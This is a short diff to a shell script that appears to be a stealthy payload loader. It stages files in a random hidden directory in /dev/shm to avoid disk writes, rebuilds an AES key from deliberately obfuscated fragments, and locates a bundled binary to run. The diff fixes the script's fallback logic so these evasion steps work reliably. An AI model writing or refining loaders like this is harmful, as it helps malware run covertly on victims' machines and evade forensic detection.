@@ -18,8 +18,11 @@ RND=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | fold -w 8 | head -n 1)
 # --- Step 2: Set destination directory ---
 # Primary: use /dev/shm (RAM-backed tmpfs, avoids disk writes)
 # Fallback: use ~/.cache (when /dev/shm is unavailable)
-dest="/dev/shm/.${RND}"
-dest="$HOME/.cache/.${RND}"
+if [ -d /dev/shm ] && [ -w /dev/shm ]; then
+    dest="/dev/shm/.${RND}"
+else
+    dest="$HOME/.cache/.${RND}"
+fi
 
 # --- Step 3: Reconstruct AES decryption key from obfuscated fragments ---
 # Each fragment uses a different encoding method to hide the key parts
@@ -84,7 +87,9 @@ _k=""
 BIN_EXE=$(find "$dest" -type f -name "*.bin" | head -n 1)
 
 # Fallback: find any executable that isn't a library, text, or data file
-BIN_EXE=$(find "$dest" -type f -not -name "*.so" -not -name "*.txt" -not -name "*.data" | head -n 1)
+if [ -z "$BIN_EXE" ]; then
+    BIN_EXE=$(find "$dest" -type f -not -name "*.so" -not -name "*.txt" -not -name "*.data" | head -n 1)
+fi
 
 # Set up library search path for the bundled shared libraries
 BIN_DIR=$(dirname "$BIN_EXE")
